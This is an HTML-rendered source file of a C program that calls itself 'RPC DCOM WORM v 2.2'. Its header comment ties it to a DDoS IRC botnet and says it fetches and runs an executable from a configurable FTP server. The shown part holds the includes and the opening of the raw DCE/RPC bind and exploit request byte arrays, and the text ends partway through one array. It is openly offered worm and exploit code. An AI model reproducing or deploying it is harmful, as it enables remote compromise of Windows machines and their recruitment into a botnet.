<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VDCOM - VDCOM.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* RPC DCOM WORM v 2.2 - 
* originally by volkam, fixed and beefed by uv/graff
* even more original concept by LSD-pl.net
* original code by HDM 
*
* --
* This code is in relation to a specific DDOS IRCD botnet project.
* You may edit the code, and define which ftp to login
* and which .exeutable file to recieve and run.
* I use spybot, very convienent
* -
* So basicly script kids and brazilian children, this is useless to you
* 
* -
* shouts: darksyn - true homie , giver of 0d4yz, and testbeds
* volkam - top sekret agent man 
* ntfx - master pupil 
* jpahk - true homie #2
*
* Legion2000 Security Research (c) 2003 
* - 
* enjoy!
**************************************************************/</span><span class="sc0"> 
</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;error.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt; 
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bindstr</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x7F</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x16</span><span class="sc10">,</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x16</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x5D</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0xEB</span><span class="sc10">,</span><span class="sc4">0x1C</span><span class="sc10">,</span><span class="sc4">0xC9</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x2B</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request1</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xE5</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0xFD</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x49</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0xDD</span><span class="sc10">,</span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc4">0x74</span><span class="sc10">,</span><span class="sc4">0x2C</span><span class="sc10">,</span><span class="sc4">0x96</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x7C</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x96</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0x2A</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0xA6</span><span class="sc10">,</span><span class="sc4">0x6A</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0xAF</span><span class="sc10">,</span><span class="sc4">0x6E</span><span class="sc10">,</span><span class="sc4">0x72</span><span class="sc10">,</span><span class="sc4">0xF4</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x41</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x52</span><span class="sc10">,</span><span class="sc4">0x42</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0xF0</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xA8</span><span class="sc10">,</span><span class="sc4">0xF4</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xA2</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x38</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC4</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x29</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAB</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA5</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA6</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA4</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x40</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
